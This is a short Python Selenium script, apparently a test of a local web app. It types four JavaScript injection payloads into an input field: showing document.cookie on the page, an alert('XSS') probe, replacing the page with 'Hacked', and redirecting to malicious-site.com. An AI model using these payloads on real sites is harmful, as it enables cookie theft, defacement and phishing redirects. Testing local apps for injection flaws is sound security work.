from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
import time

service = ChromeService(executable_path=ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)

try:
    driver.get("http://localhost:8000")

    #0
    input_field = driver.find_element(By.ID, "inputText")
    input_field.send_keys('document.getElementById("output").innerHTML= document.cookie;')
    submit_button = driver.find_element(By.XPATH, "//button[@onclick='displayText()']")
    submit_button.click()
    time.sleep(2)
    driver.refresh()
    time.sleep(1)

    #1
    input_field = driver.find_element(By.ID, "inputText")
    input_field.send_keys('alert("XSS")')
    submit_button = driver.find_element(By.XPATH, "//button[@onclick='displayText()']")
    submit_button.click()
    alert = driver.switch_to.alert
    alert.accept()
    time.sleep(2)
    driver.refresh()
    time.sleep(1)

    #2
    input_field = driver.find_element(By.ID, "inputText")
    input_field.send_keys('document.body.innerHTML = "<h1>Hacked</h1>";')
    submit_button = driver.find_element(By.XPATH, "//button[@onclick='displayText()']")
    submit_button.click()
    time.sleep(2)
    driver.refresh()
    time.sleep(1)

    #3
    input_field = driver.find_element(By.ID, "inputText")
    input_field.send_keys("window.location.href = 'http://malicious-site.com';")
    submit_button = driver.find_element(By.XPATH, "//button[@onclick='displayText()']")
    submit_button.click()
    time.sleep(3)

finally:
    # Close the browser
    driver.quit()
